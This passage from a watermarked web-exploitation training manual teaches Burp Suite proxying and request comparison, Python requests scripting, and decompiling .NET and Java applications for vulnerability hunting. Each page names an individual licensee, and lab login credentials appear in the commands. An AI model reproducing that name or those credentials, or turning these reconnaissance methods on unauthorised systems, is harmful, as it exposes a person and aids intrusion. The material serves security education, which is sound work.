Note that doing this on a top-level domain URL request will add the entire domain to the scope. 
Alternatively, performing this action against a more-specific page of a given web application will 
only add that single page to the scope. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
25 
 
Figure 11: Burp Suite “Add to scope” feature 
Once we set the scope, we are given the option to stop capturing items that are not in scope. We 
will choose Yes. 
 
Figure 12: Burp Suite scope warning 
Now that we have the Concord server added to our scope, we can change the HTTP history filter 
settings to display only in-scope items. We’ll do this by clicking the filter box, selecting Show only 
in-scope items, and clicking away from the filter box. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
26 
 
Figure 13: Burp Suite Show only in-scope items 
Once the filter is updated, the request for content-autofill.googleapis.com is hidden as shown 
below in Figure 14. Setting scope in Burp Suite can eliminate the “noise” caused by browsers 
attempting to update themselves or downloading other resources. 
 
Figure 14: BurpSuite history showing only in-scope items 
We can verify that our scope has been properly set by switching to the Target tab and then 
selecting the Scope subtab. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
27 
 
Figure 15: Burp Suite scope listing 
The Target Scope lists the base URL for the Concord server with a checkmark indicating it is 
enabled. 
2.1.4 Burp Suite Repeater and Comparer 
While inspecting web applications, we often need to determine how granular changes to our 
HTTP requests affect the response a web server might return. In those instances, we can use the 
Burp Suite Repeater tool to make arbitrary and very precise changes to a captured request and 
then resend it to the target web server. 
Let’s try it out. We’ll switch back to the Proxy > HTTP history tab and use the request to 
/api/service/console/whoami. Let’s right-click on it and choose Send to Repeater (Figure 16). 
 
Figure 16: Burp Suite Send to Repeater 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
28 
2.1.4.1.1 
 
Once we switch over to the Repeater tab, we will first click Send to resend our original 
(unmodified) request. The response will establish a baseline against which we can evaluate 
subsequent arbitrarily-modified requests to the same URL and any corresponding responses. 
 
Figure 17: Burp Suite Repeater resending request 
Now that we have a baseline response, we will make a slight change to our original request. One 
interesting aspect of the baseline response is that it includes several Access-Control headers. 
These headers usually indicate the application supports Cross-Origin Resource Sharing10 (CORS). 
Our original request did not include an origin header. Let’s find out what happens if we send one. 
We’ll add “Origin: hello.world” to the request and then click Send. 
 
10 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Cross-origin_resource_sharing 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
29 
 
Figure 18: Burp Suite sending a modified request 
In Figure 18, the response has a different Access-Control-Allow-Origin value, which reflects the 
value we sent. To better compare the responses, we can use the Comparer feature by right-
clicking on the response and selecting Send to Comparer. 
 
Figure 19: Burp Suite send response to Comparer 
Before we switch to the Comparer tab, let’s navigate back to our original request (Figure 20) and 
Send to Comparer so that we have two different responses we can compare (Figure 21). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
30 
 
Figure 20: Burp Suite Repeater previous request and response 
 
Figure 21: Burp Suite send second response to Comparer 
We can now switch to the Comparer tab, where Burp Suite has automatically highlighted our 
different responses in their respective windows. At this point, we have the option of comparing 
the responses for differences in Words or Bytes. We will choose the Words option (Figure 22) 
since this example does not include a binary response. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
31 
 
Figure 22: Burp Suite Comparer tab 
Burp Suite displays the comparison results in a dedicated window (Figure 23), highlighting each 
change with color-coding for Modified, Deleted, and Added. 
 
Figure 23: Burp Suite Comparer tab - comparing Words 
In this example, Burp Suite highlighted Modified and Deleted differences between the two 
responses. We previously identified the change to the Access-Control-Allow-Origin value, but 
Comparer has also highlighted that the Vary and Access-Control-Allow-Credentials headers are 
present on the first response but not on the second. 
While this is a very simple example, it shows how the Repeater and Comparer tools can be 
extremely valuable when testing a web application. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
32 
2.1.5 Burp Suite Decoder 
While inspecting modern web applications, we will often encounter encoded data in HTTP 
requests and responses. Fortunately, Burp Suite has a versatile decoder tool that is easy to use in 
our workflow. 
As an example, let’s switch to our browser and try logging in to the Concord application with “test” 
as our username and password. This returns “Invalid username and/or password”. Let’s switch 
back to Burp Suite. Interestingly, our browser sent a GET request to /api/service/console/whoami. 
Login requests are usually POSTs. Let’s click on the new request. 
The new GET request included an authorization header with the value “Basic dGVzdDp0ZXN0”. If 
we select the text “dGVzdDp0ZXN0”, the Inspector tool will detect that it is base64-encoded and 
display the decoded text on the right-hand side of the Burp Suite window. 
 
Figure 24: Burp Suite login request 
The Inspector tool is useful for quickly decoding common types of encoding within the HTTP 
history tab. Burp Suite’s Decoder tool is a more-powerful version of the Inspector tool. Let’s try it 
out by right-clicking on the highlighted text and selecting Send to Decoder. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
33 
 
Figure 25: Burp Suite Send to Decoder feature 
Now if we switch to the Decoder tab, we can choose the Decode as option to the right and select 
Base64 for the encoding scheme (Figure 26). 
 
Figure 26: Burp Suite decoding the selected values 
As a result, a second textbox with the decoded value opens below our original data. 
 
Figure 27: Burp Suite successfully decoded the selected values 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
34 
2.1.5.1.1 
 
The decoded value matches the output from the Inspector tool, but the Decoder tool enables 
options for encoding, decoding, and hashing. 
So far, we have only demonstrated a few basic, albeit useful, features of Burp Suite. This tool 
contains many more features that can be very helpful when researching complex modern web 
applications. 
2.1.5.2 Exercises 
1. 
Take some time to familiarize yourself with the Burp Suite proxy and its various capabilities. 
2. 
Spend time learning more about the basic Burp Suite features11 as this knowledge will 
improve the efficiency of your workflow. 
2.2 Interacting with Web Listeners using Python 
In this course, we will be creating complex web application exploits in Python. 
If you are already well-versed in a different language and prefer to develop the 
solutions for the course exercises in that language, you are certainly welcome to 
do so. 
However, Python has undergone a significant change lately. As of January 2020, Python 2 will no 
longer be supported and will be officially replaced by Python 3. However, many operating 
systems, including Debian, include Python 2 as the python binary package and Python 3 as 
python3. For this reason, when we use python to run a script in this course, we are using Python 
2 and when we use python3, we are using Python 3. In addition, certain libraries provided with 
Python 2 by default are being removed. To compensate for this, we have provided the offsec-
awae package (installed with sudo apt-get install offsec-awae) to install the missing 
libraries. 
When using Python, we’ll often use the requests library to interact with our web applications. 
While there are many well-written requests guides (including the official documentation12), we will 
demonstrate some basic examples in this module. 
For example, the following script will issue an HTTP request to the ManageEngine13 web server in 
the labs and output the details of the relative response: 
01: import requests 
02: from colorama import Fore, Back, Style 
03: 
04: requests.packages.urllib3.\ 
05: disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) 
06: def format_text(title,item): 
07:   cr = '\r\n' 
 
11 (PortSwigger Ltd., 2020), https://portswigger.net/burp/documentation 
12 (Python Software Foundation, 2017), http://docs.python-requests.org/en/master/ 
13 (ManageEngine, 2020), https://www.manageengine.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
35 
08:   section_break = cr +  "*" * 20 + cr 
09:   item = str(item) 
10:   text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + 
section_break 
11:   return text 
12: 
13: r = requests.get('https://manageengine:8443/',verify=False) 
14: print(format_text('r.status_code is: ',r.status_code)) 
15: print(format_text('r.headers is: ',r.headers)) 
16: print(format_text('r.cookies is: ',r.cookies)) 
17: print(format_text('r.text is: ',r.text)) 
Listing 2 - A basic requests library example 
On lines 1-2 of Listing 2, we import the requests module as well as a module to display output in 
different colors. Lines 4-5 disable the display of certificate warnings when requests are made to 
websites using insecure certificates. This can be useful in scenarios where targeted web 
applications use self-signed certificates as is the case in the AWAE labs. 
Lines 6-11 implement a function to display the response headers and body in an organized way. 
On line 13, we set r to the result of a GET request to the ManageEngine web server in the labs. 
Notice that in our request, we set the verify flag to “False”. This prevents the library from verifying 
the SSL/TLS certificate. Finally, lines 14-17 demonstrate how to access a few common 
components of an HTTP server response. 
Let’s save this script as manageengine_web_request.py, run it, and check the details of the web 
server response: 
kali@kali:~$ python3 manageengine_web_request.py  
r.status_code is:  
******************** 
200 
******************** 
 
r.headers is:  
******************** 
{'Content-Length': '261', 'Set-Cookie': 
'JSESSIONID_APM_9090=808639988060D663A797DF8EA8019F67; Path=/; Secure; HttpOnly', 
'Accept-Ranges': 'bytes', 'Server': 'Apache-Coyote/1.1', 'Last-Modified': 'Fri, 09 Sep 
2016 14:06:48 GMT', 'ETag': 'W/"261-1473430008000"', 'Date': 'Fri, 14 Sep 2018 
12:51:15 GMT', 'Content-Type': 'text/html'} 
******************** 
 
r.cookies is:  
******************** 
<RequestsCookieJar[<Cookie JSESSIONID_APM_9090=808639988060D663A797DF8EA8019F67 for 
manageengine.local/>]> 
******************** 
 
r.text is:  
******************** 
<!-- $Id$ --> 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> 
<html> 
<head> 
<!-- This comment is for Instant Gratification to work applications.do --> 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
36 
<script> 
 
    window.open("/webclient/common/jsp/home.jsp", "_top"); 
 
</script> 
 
</head> 
</html> 
 
******************** 
Listing 3 - Response output generated by our script request 
The request was successful and the different parts of the HTTP response can easily be accessed 
as properties of the Python object (r). 
We may need to debug the requests that are generated by our proof-of-concept Python scripts. 
Fortunately, the requests library comes with built-in proxy support. To use it, we only need to add 
a Python dictionary object to our script containing the proxy IP address, port, and protocol, which 
will be used in our requests.get function call. Let’s update our script to include that. 
01: import requests 
02: from colorama import Fore, Back, Style 
03: 
04: 
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.Insecu
reRequestWarning) 
05: 
06: proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} 
07: def format_text(title,item): 
08:   cr = '\r\n' 
09:   section_break = cr +  "*" * 20 + cr 
10:   item = str(item) 
11:   text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + 
section_break 
12:   return text; 
13: 
14: r = requests.get('https://manageengine:8443/',verify=False, proxies=proxies) 
15: print(format_text('r.status_code is: ',r.status_code)) 
16: print(format_text('r.headers is: ',r.headers)) 
17: print(format_text('r.cookies is: ',r.cookies)) 
18: print(format_text('r.text is: ',r.text)) 
Listing 4 - Using Python requests proxy support 
The updated script generates responses similar to those shown in Listing 3. This time however, 
we should be able to locate our request/response in the Burp Suite History tab. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
37 
 
Figure 28: Burp Suite History still shows only requests performed against the Concord server 
Unfortunately, after running our script, Burp Suite still only list requests to the Concord web server 
(Figure 28). This is because we forgot to add the ManageEngine target to our scope! This is an 
easy fix but first, we will need to re-enable the capture of out-of scope items in the Proxy > HTTP 
history tab where we’ll click Re-enable as shown in Figure 29. 
 
Figure 29: Re-enabling the out-of-scope traffic capture 
Now we can re-run our Python script, navigate back to the Target > Site map tab, right-click on the 
ManageEngine URL, and select Add to scope (Figure 30). 
 
Figure 30: Adding the ManageEngine server to scope 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
38 
2.2.1.1.1 
 
Finally, we can navigate to the HTTP history tab, where we can inspect the captured 
ManageEngine request. 
 
Figure 31: Viewing the Python script request in the Proxy tab 
At this point, we could also repeat the step from Figure 13, in order to only show in-scope items in 
our history. 
While the previous example is rather simple in nature, it provides us with a starting point for proof-
of-concept scripts we will develop in later modules. 
2.2.1.2 Exercises 
1. 
Repeat the steps outlined in this section and make sure you can intercept HTTP requests 
from the proof-of-concept script. 
2. 
Familiarize yourself with the requests Python library as we will leverage it extensively in the 
complex scripts we’ll create in later modules. 
2.3 Source Code Recovery 
As we mentioned in the introduction, we must learn how to recover the source code from web 
applications written in compiled languages. In this course, we will be focusing mainly on Java and 
.NET source code recovery, as they are directly related to the vulnerable applications we will 
explore. 
2.3.1 Managed .NET Code 
Later in the course, we will deal with a vulnerable version of the DotNetNuke14 .NET web 
application. This also implies that we will need to decompile managed .NET executable files. 
Once again, there are a number of tools we can use to accomplish this goal, some of which even 
integrate seamlessly with Visual Studio. Most commonly-used .NET decompilers can also be 
used as debuggers. 
 
14 (DNN Corp., 2020), https://www.dnnsoftware.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
39 
With that said, we will use the freely-available dnSpy15 decompiler and debugger for this purpose, 
as it provides all we need. Specifically, dnSpy uses the ILSpy16 decompiler engine to extract the 
source code from a .NET compiled module. 
2.3.1.1 Decompilation 
Let’s use a simple C# program to demonstrate a very basic workflow for decompiling .NET 
executables. First, we’ll connect to the DNN lab machine through remote desktop from Kali. The 
credentials are listed in the course material. 
kali@kali:~$ xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:dnn 
/u:administrator /p:studentlab /size:1180x708 
Listing 5 - Using xfreerdp to connect to the DNN VM 
Next, let’s use Notepad++ to create a text file on the Windows virtual machine Desktop with the 
following code: 
using System; 
 
namespace dotnetapp 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            Console.WriteLine("What is your favourite Web Application Language?"); 
            String answer = Console.ReadLine(); 
            Console.WriteLine("Your answer was: " + answer + "\r\n"); 
        } 
    } 
} 
Listing 6 - A basic C# application 
We will save this file as test.cs. In order to compile it, we’ll use the csc.exe17 compiler from the 
.NET framework. 
c:\Users\Administrator\Desktop>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe 
test.cs 
Listing 7 - Compiling the test executable 
 
15 (0xd4d, 2020), https://github.com/0xd4d/dnSpy 
16 (ICSharpCode , 2020), https://github.com/icsharpcode/ILSpy 
17 (MicroSoft, 2021), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-
with-csc-exe 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
40 
 
Figure 32: Using CSC.exe to compile 
Once our test.exe is created, let’s execute it to make sure it works properly. 
c:\Users\Administrator\Desktop>test.exe 
What's your favorite web application language? 
C-Sharp 
Your answer was: C-Sharp 
Listing 8 - Testing the sample executable 
We can now open dnSpy and attempt to decompile this executable’s code. We’ll drag the test.exe 
file to the dnSpy window, which automatically triggers the decompilation process in dnSpy. 
 
Figure 33: Test.exe in dnSpy 
To view the source code of this executable, we’ll have to expand the test assembly navigation tree 
and select test.exe, dotnetapp, and then Program, as shown in Figure 34. According to the output, 
the decompilation process was successful. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
41 
 
Figure 34: Navigating to the decompiled source code 
Excellent! We successfully decompiled the executable. 
2.3.1.2 Cross-References 
When analyzing and debugging more complex applications, one of the most useful features of a 
decompiler is the ability to find cross-references18 to a particular variable or function. We can use 
cross-references to better understand the code logic. For example, we can monitor the execution 
flow statically or set strategic breakpoints19 to debug and inspect the target application. We can 
demonstrate the effectiveness of cross-references in this process with a simple example. 
Let’s suppose that while studying our DotNetNuke target application, we noticed a few Base64-
encoded values in the HTTP requests captured by Burp Suite. Since we would like to better 
understand where these values are decoded and processed within our target application, we 
could make the assumption that any functions that handle Base64-encoded values contain the 
word “base64”. 
We’ll follow this assumption and start searching for these functions in dnSpy. For a thorough 
analysis we should open all the .NET modules loaded by the web application in our decompiler. 
However, for the purpose of this exercise, we’ll only open the main DNN module, 
C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll, and search for the term “base64” within 
method names as shown in Figure 35. 
 
18 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Cross-reference 
19 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Breakpoint 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
42 
 
Figure 35: Opening DotNetNuke.dll 
The search result provides us with a list of method names containing the term “base64”(shown in 
Figure 36). 
 
Figure 36: Searching for a base64 string 
Let’s pick one of the functions and try to find its cross-references. We’ll select the 
Base64UrlDecode function by right-clicking on it and selecting Analyze from the context menu. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
43 
 
Figure 37: Analyzing a function 
The results should appear in the Analyzer window. Specifically, expanding the function name 
reveals two options: Used By and Uses (Figure 38). 
 
Figure 38: Finding cross-references for a given function 
As the name suggests, the Used By node expands to reveal where our example function is called 
within the target DLL. This is extremely useful when analyzing source code. If we now click on the 
cross-reference, dnSpy reveals the location of the function call in the source code (Figure 39). 
 
Figure 39: Showing the cross-reference in the source code 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
44 
2.3.1.2.1 
 
2.3.1.3 Modifying Assemblies 
Finally, let’s demonstrate how to arbitrarily modify assemblies. We can use this technique to add 
debugging statements to a log file or alter an assembly’s attributes in order to better debug our 
target application. 
In order to demonstrate this technique, we will briefly return to our previous custom executable 
file and edit it using dnSpy. Let’s right-click Program and choose Edit Class (Figure 40). 
 
Figure 40: Editing a class in dnSpy 
Then we’ll change “Your answer was:” to “You said:” (Figure 41). 
 
Figure 41: Modifying code the source code with dnSpy 
And finally, we’ll click Compile, then File > Save All to overwrite the original version of the 
executable file (Figure 42 and Figure 43). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
45 
 
Figure 42: Saving our modified assembly 
 
Figure 43: Replacing our original test.exe file 
If we return to our command prompt and re-run test.exe, the second print statement is now “You 
said:” (Figure 44). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
46 
 
Figure 44: Running an edited executable 
Using a very basic example application, we have demonstrated how to recover the source code of 
.NET-based applications and how to find cross-references with the help of our favorite 
decompiler. We also demonstrated how to modify and save a .NET assembly file. Even if this 
modification doesn’t seem particularly useful, it will come in handy later on in the course when we 
will have to alter assemblies’ attributes in order to better debug our target application. 
2.3.2 Decompiling Java Classes 
While there are many tools that we could use to decompile Java bytecode (with various degrees 
of success), we will use the JD-GUI decompiler in this course. Java-based web applications 
primarily consist of compiled Java class files that are compressed into a single file, a Java 
ARchive, or JAR, file. Using JD-GUI, we can extract the class files and subsequently decompile 
them back to Java source code. 
Let’s demonstrate decompilation in JD-GUI with a test JAR file. We’ll create JAR/test.java on our 
Kali machine: 
import java.util.*; 
 
public class test{ 
    public static void main(String[] args){ 
        Scanner scanner = new Scanner(System.in); 
        System.out.println("What is your favorite Web Application Language?"); 
        String answer = scanner.nextLine(); 
        System.out.println("Your answer was: " + answer); 
    } 
} 
Listing 9 - A simple Java application 
This basic Java application prompts for the user’s favorite language and prints the answer to the 
console. As part of the compilation process, we also set the Java source and target versions to 
1.8, which is the current long-term suggested version from Oracle (Listing 10). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
47 
For this section, we will need a Java Development Kit (JDK) to compile the Java 
source. If it is not already installed, we can install it in Kali with “sudo apt install 
default-jdk”. 
kali@kali:~$ javac -source 1.8 -target 1.8 test.java 
warning: [options] bootstrap class path not set in conjunction with -source 1.8 
1 warning 
Listing 10 - Setting the relative Java version during compilation 
After compiling the source code, test.class is written to our JAR directory. In order to package our 
class as a JAR file, we will need to create a manifest file.20 This is easily accomplished by creating 
the JAR/META-INF directory and adding our test class to the MANIFEST.MF file as shown below. 
kali@kali:~$ mkdir META-INF 
 
kali@kali:~$ echo "Main-Class: test" > META-INF/MANIFEST.MF 
Listing 11 - Creating the manifest for the JAR test file 
We can now create our JAR file by running the following command: 
kali@kali:~$ jar cmvf META-INF/MANIFEST.MF test.jar test.class 
added manifest 
adding: test.class(in = 747) (out= 468)(deflated 37%) 
Listing 12 - Creating the JAR test file 
Let’s test our example class to make sure it’s working properly: 
kali@kali:~$ java -jar test.jar 
What is your favorite Web Application Language? 
Java 
Your answer was: Java 
Listing 13 - Testing the JAR test file 
Great! Now that we know our JAR file works, let’s copy it to the machine running JD-GUI. In our 
lab, this is the ManageEngine virtual machine. One easy way to transfer files is via SMB with an 
Impacket script. In our JAR directory, we will issue the following command: 
 
20 (Oracle, 2020), https://docs.oracle.com/javase/tutorial/deployment/jar/manifestindex.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
48 
 
Figure 45: Creating a temporary SMB Server on Kali Linux 
With our Samba server running, we need to connect to the ManageEngine server with xfreerdp. 
Refer to the course materials for the correct RDP credentials. 
kali@kali:~$ xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:manageengine 
/u:administrator /p:studentlab /size:1180x708 
Listing 14 - Using xfreerdp to connect to the ManageEngine VM 
Once connected to the ManageEngine server, we’ll use Windows Explorer to navigate to our Kali 
SMB server using the \\your-kali-machine-ip\test path. We’ll then copy test.jar to the desktop of 
the ManageEngine virtual machine. Finally, we can open JD-GUI using the taskbar shortcut and 
drag our JAR file on its window. 
 
Figure 46: Opening a jar file in JD-GUI to decompile it 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
49 
2.3.2.1.1 
 
At this point, we should be able to use the left navigation pane to navigate to the decompiled code 
in JD-GUI, as shown in Figure 47. 
 
Figure 47: Navigating the decompiled source code 
In a manner similar to the cross-reference analysis we performed with dnSpy, we can also search 
the decompiled classes for arbitrary methods and variables with JD-GUI. However, the user 
interface is non-intuitive and may be cumbersome when used with large and complex 
applications. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
50 
 
Figure 48: Searching for arbitrary strings in JD-GUI 
We will present techniques for overcoming these limitations in a later module. 
2.3.2.2 Exercise 
Try to decompile and explore additional .NET and Java compiled files in order to become more 
familiar with the dnSpy and JD-GUI user interfaces. There are many JAR files in the C:\Program 
Files (x86)\ManageEngine\AppManager12\working\classes directory on the ManageEngine lab 
machine and .NET managed modules in the C:\inetpub\wwwroot\dotnetnuke\bin directory on the 
DNN machine. 
2.4 Source Code Analysis Methodology 
Once we have obtained the source code, we’re ready to tackle source code analysis, which is 
arguably the hardest technique to master in our workflow. This is due to the prolific use of third-
party frameworks in modern web applications, which can obscure the flow of data. Our analysis is 
further complicated by the variety of coding practices and styles. 
Because of this, we should spend some time walking through the web application in a browser to 
familiarize ourselves with its functionality before we dive in to source code analysis. We should 
proxy our browser traffic through Burp Suite while we are doing this so that we can analyze the 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
51 
HTTP requests and responses generated during normal use of the application. We might be able 
to learn which technologies are in use and how the application maps routes and passes data 
based on this information. The information we gather during this walkthrough can help us refine 
our focus during source code analysis. 
An application’s attack surface depends on many factors including its intended use cases and its 
software stack. For example, a web application that hosts user content might have more 
instances of cross-site scripting than an application that moves files between different servers. 
Similarly, programming languages and frameworks can also influence the types of vulnerabilities 
that might exist in the application. However, we should not automatically exclude any types of 
vulnerabilities from our analysis. 
2.4.1 An Approach to Analysis 
When we are analyzing application source code, we need to be mindful of sources and sinks. Data 
enters an application through a source, and is used (or operated on) in a sink. 
Let’s consider a typical login flow. We submit a user name and password to the application in a 
POST request. The code that handles this POST request is a source. The code may then run 
some input validation on the username and password values and then execute a database query 
with those values. The call to the database to run the query is the sink in this scenario. 
Our approach to manual source code analysis will vary depending on whether we choose to begin 
with the examination of sources or sinks. 
In a “top down” approach, we would identify sources first. If we do not have authenticated access 
to the web application, we would obviously begin searching for vulnerabilities in unauthenticated 
resources. Tracing the application flows to their respective sinks, we would then attempt to 
identify any sensitive functionality and determine what controls are in place (such as input 
validation). 
In a “bottom up” approach, we would first identify sinks. Our goal would be to determine if any 
sinks contain vulnerabilities and what variables or values the vulnerable code uses. We would 
then need to determine how the application calls the vulnerable function and trace the application 
flow back to a source. As with the “top down” approach, we need to be mindful of any filters or 
input sanitization that might affect the payload needed to exploit the vulnerable function. 
A “bottom up” approach is more likely to result in higher-severity vulnerabilities with a lower 
likelihood of exposure. A “top down” approach, however, is likely to uncover lower-severity 
vulnerabilities with a higher likelihood of exposure. For example, vulnerabilities discovered during 
a “bottom up” approach might allow admin users to gain remote code execution. On the other 
hand, vulnerabilities discovered in a “top down” approach might allow any user to exploit cross-
site scripting. 
Because of this, we may need to tailor our approach if we are searching for a particular type of 
vulnerability or we may need to vary our approach based on what we find in a given application. 
These approaches are not meant to be rigid. With time and practice, we will learn the valuable skill 
of adapting our methodologies and altering our techniques. 
Regardless of which approach we use, our end goals are the same: we want to identify 
vulnerabilities or logic errors in the application, determine how to call the vulnerable code, and 
bypass restrictions. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
52 
2.4.2 Using an IDE 
An integrated development environment21 (IDE) is a powerful tool for source code analysis. Most 
IDEs can perform advanced code search and debugging. The “best” IDE is often a matter of 
personal preference. In this course, we rely heavily on Visual Studio Code since it supports 
multiple programming languages via extensions. However, we will also leverage specialized tools 
such as dnSpy. As our personal methodology evolves, the process of choosing the best tool and 
applying it properly will become more natural. 
During a manual source code analysis, we’ll spend a great deal of time searching code and 
refining our searches. 
Let’s begin with a simple example in which we attempt to review the login functionality of an 
application. We could begin with a search for “password”. 
 
Figure 49: Searching for password 
This produces many results from several different types of files, and unfortunately, many of the 
results are useless. 
 
21 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Integrated_development_environment 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
53 
 
Figure 50: Search results 
What we do next depends on our personal methodology. We might choose to review the HTML 
files to determine how the login or password reset forms are set up. The JavaScript files might 
contain client-side logic or “secret” values. However, we could start with the application code, 
which, in this example, means the Java source files. 
Either way, we can refine our search by clicking the Toggle Search Details button (represented by 
three dots). 
 
Figure 51: Toggle Search Details button 
With Search Details toggled on, we can refine our search to include or exclude certain file types. 
For example, we could limit our search to only Java files by entering “.java” in the files to include 
field. As with any search filter, we want to avoid “over-filtering”, which may exclude important 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
54 
results, essentially creating false negatives.22 We can also use regular expressions in Visual 
Studio Code searches. We’ll demonstrate this in a later module. 
If a search term returns too many results, we could use unique keywords from the application to 
narrow the search results. Some sources for keywords include application web pages, requests, 
and error messages. For example, if the login page of a target application returns an “Incorrect 
credentials” message, we could search for that text to find where the error is thrown and work 
backwards to discover the login function. 
If we identify a vulnerable function and need to determine where the application uses it, we can 
search for “references” (in most IDEs) to locate application methods or function calls. To do this 
in Visual Studio Code, we simply right-click on a function or method name to open a context 
menu and Find All References. 
 
Figure 52: Find All References 
Visual Studio Code lists the results on the left side of the window. 
 
22 (Wikipedia, 2021), https://en.wikipedia.org/wiki/False_positives_and_false_negatives 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
55 
 
Figure 53: Reference Results 
2.4.3 Common HTTP Routing Patterns 
We will spend a lot of time searching through source code to understand how an application 
receives an HTTP request and determines what code to run to generate the associated HTTP 
response. This is known as HTTP Routing. This information is important regardless of how we 
approach source code analysis. Our goal is to trace the flow of a request through the application. 
The web server, programming language, and framework used by an application all influence its 
HTTP routing configuration. Let’s review a few common HTTP routing patterns. 
File System Routing maps the URL of a request to a file on the server’s filesystem. In this scheme, 
the web server defines a document root (also known as a web root), where it stores externally 
accessible files. For example, the Apache HTTP Server on Ubuntu uses /var/www/html as its 
default document root.23 When the server receives an HTTP request, the server inspects the path 
of the URL and tries to find a file that matches the path in the document root. In other words, if we 
request http://example.com/funnyCats.html, the server would serve the file located at 
/var/www/html/funnyCats.html. If the server cannot find that file, it will instead respond with a 
404 message. 
